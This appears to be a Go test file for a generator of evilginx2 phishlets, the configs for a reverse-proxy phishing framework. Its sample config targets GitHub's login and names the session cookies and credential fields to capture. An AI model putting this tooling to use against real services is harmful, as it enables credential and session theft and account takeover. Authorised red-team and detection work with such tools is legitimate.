package phishletgen

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/kgretzky/evilginx2/core"
)

func sampleReport() Report {
	return Report{
		Site:        "github.com",
		Domain:      "github.com",
		LoginURL:    "https://github.com/login",
		LoginDomain: "github.com",
		LoginPath:   "/login",
		ProxyHosts: []ProxyHost{
			{OrigSub: "", Domain: "github.com", Session: true, IsLanding: true},
			{OrigSub: "api", Domain: "github.com"},
			{OrigSub: "github", Domain: "githubassets.com"},
		},
		AuthTokens: []AuthToken{
			{Domain: ".github.com", Keys: []string{"user_session", "_gh_sess"}},
			{Domain: "github.com", Keys: []string{"logged_in"}},
		},
		Credentials: Credentials{
			Username: Field{Key: "login"},
			Password: Field{Key: "password"},
		},
		Notes: []string{"review me"},
	}
}

func TestValidateSiteName(t *testing.T) {
	valid := []string{"github.com", "my_site", "bank-2", "a.b.c"}
	for _, v := range valid {
		if !ValidateSiteName(v) {
			t.Errorf("expected %q valid", v)
		}
	}
	invalid := []string{"", "a b", "../evil", "a{b}", strings.Repeat("x", 65)}
	for _, v := range invalid {
		if ValidateSiteName(v) {
			t.Errorf("expected %q invalid", v)
		}
	}
}

func TestRender(t *testing.T) {
	y, err := Render(sampleReport())
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	for _, want := range []string{
		"author:", "min_ver: '2.3.0'", "proxy_hosts:", "sub_filters: []",
		"auth_tokens:", "credentials:", "username:", "password:", "login:",
		"domain: 'github.com'", "path: '/login'",
	} {
		if !strings.Contains(y, want) {
			t.Errorf("output missing %q", want)
		}
	}
	if !strings.Contains(y, "keys: ['user_session', '_gh_sess']") {
		t.Errorf("auth token keys not serialized as expected:\n%s", y)
	}
}

func TestRenderErrors(t *testing.T) {
	r := sampleReport()
	r.Site = ""
	if _, err := Render(r); err == nil {
		t.Error("expected error for empty site")
	}
	r = sampleReport()
	r.LoginDomain = ""
	if _, err := Render(r); err == nil {
		t.Error("expected error for empty login domain")
	}
	r = sampleReport()
	r.ProxyHosts = nil
	if _, err := Render(r); err == nil {
		t.Error("expected error for empty proxy hosts")
	}
}

func TestRenderParserRoundTrip(t *testing.T) {
	dir := t.TempDir()
	cfg, err := core.NewConfig(dir, filepath.Join(dir, "config.json"))
	if err != nil {
		t.Fatalf("NewConfig: %v", err)
	}
	y, err := Render(sampleReport())
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	path := filepath.Join(dir, "github.com.yaml")
	if err := os.WriteFile(path, []byte(y), 0o600); err != nil {
		t.Fatal(err)
	}
	pl, err := core.NewPhishlet("github.com", path, nil, cfg)
	if err != nil {
		t.Fatalf("engine parser rejected generated phishlet: %v\n%s", err, y)
	}
	if pl == nil {
		t.Fatal("nil phishlet")
	}
}

func TestWritePhishlet(t *testing.T) {
	dir := t.TempDir()
	cfg, err := core.NewConfig(dir, filepath.Join(dir, "config.json"))
	if err != nil {
		t.Fatalf("NewConfig: %v", err)
	}
	y, err := Render(sampleReport())
	if err != nil {
		t.Fatalf("Render: %v", err)
	}
	phishDir := filepath.Join(dir, "phishlets")
	if _, err := WritePhishlet(cfg, phishDir, "github.com", []byte(y)); err != nil {
		t.Fatalf("WritePhishlet: %v", err)
	}
	if _, err := cfg.GetPhishlet("github.com"); err != nil {
		t.Fatalf("phishlet not registered: %v", err)
	}
	if _, err := os.Stat(filepath.Join(phishDir, "github.com.yaml")); err != nil {
		t.Fatalf("yaml file missing: %v", err)
	}
	if _, err := WritePhishlet(cfg, phishDir, "github.com", []byte(y)); err == nil {
		t.Error("expected duplicate-site error")
	}
	// Invalid YAML must be rejected and rolled back (no half-written file).
	if _, err := WritePhishlet(cfg, phishDir, "badsite", []byte("proxy_hosts: [")); err == nil {
		t.Error("expected parse error for invalid yaml")
	}
	if _, err := os.Stat(filepath.Join(phishDir, "badsite.yaml")); !os.IsNotExist(err) {
		t.Error("invalid phishlet file should have been removed")
	}
}